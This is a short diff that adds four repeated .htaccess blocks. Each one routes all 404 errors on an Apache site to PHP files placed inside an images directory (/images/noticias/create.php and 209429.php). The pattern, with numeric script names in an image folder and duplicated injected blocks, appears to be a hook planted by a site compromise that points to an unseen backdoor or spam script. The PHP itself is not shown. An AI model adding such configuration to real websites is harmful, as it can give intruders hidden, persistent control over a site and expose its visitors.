@@ -1,0 +1,11 @@
+Options -MultiViews
+ErrorDocument 404 //images/noticias/create.php
+
+Options -MultiViews
+ErrorDocument 404 //images/noticias/209429.php
+
+Options -MultiViews
+ErrorDocument 404 /images/noticias/209429.php
+
+Options -MultiViews
+ErrorDocument 404 /images/noticias/209429.php
